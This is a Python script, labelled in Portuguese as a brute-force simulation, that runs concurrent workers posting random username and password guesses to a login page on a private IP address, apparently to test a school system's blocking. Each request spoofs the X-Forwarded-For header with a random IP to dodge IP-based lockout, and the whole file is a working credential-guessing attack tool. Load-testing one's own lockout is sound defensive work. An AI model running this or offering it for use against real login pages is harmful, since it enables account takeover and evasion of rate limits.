import asyncio
import httpx
import random
import os

TARGET_URL = os.getenv("TARGET_URL", "https://10.10.100.4/login")
LOGIN_TYPE = os.getenv("LOGIN_TYPE", "student")
CONCURRENCY = int(os.getenv("CONCURRENCY", "15"))

usernames = ["admin", "root", "professor", "aluno", "joao", "maria", "pedro", "test", "user", "guest"]

async def attack_worker(worker_id):
    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
        while True:
            ip = f"{random.randint(11,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            user = random.choice(usernames)
            password = f"senha_{random.randint(100, 9999)}"
            
            headers = {"X-Forwarded-For": ip}
            data = {"username": user, "password": password, "login_type": LOGIN_TYPE}
            
            try:
                resp = await client.post(TARGET_URL, data=data, headers=headers, follow_redirects=False)
                if resp.status_code == 302:
                    loc = resp.headers.get("location", "")
                    if "error=blocked" in loc:
                        print(f"[Worker {worker_id}] [!] IP {ip} BLOQUEADO.", flush=True)
                    else:
                        print(f"[Worker {worker_id}] Tentativa falha ({ip}): {user}:{password}", flush=True)
                else:
                    print(f"[Worker {worker_id}] Resp {resp.status_code} ({ip}) - {user}:{password}", flush=True)
            except Exception as e:
                print(f"[Worker {worker_id}] Erro: {e}", flush=True)
            
            await asyncio.sleep(0.1)

async def main():
    print(f"--- Iniciando Simulação de Brute Force ---", flush=True)
    tasks = [attack_worker(i) for i in range(CONCURRENCY)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())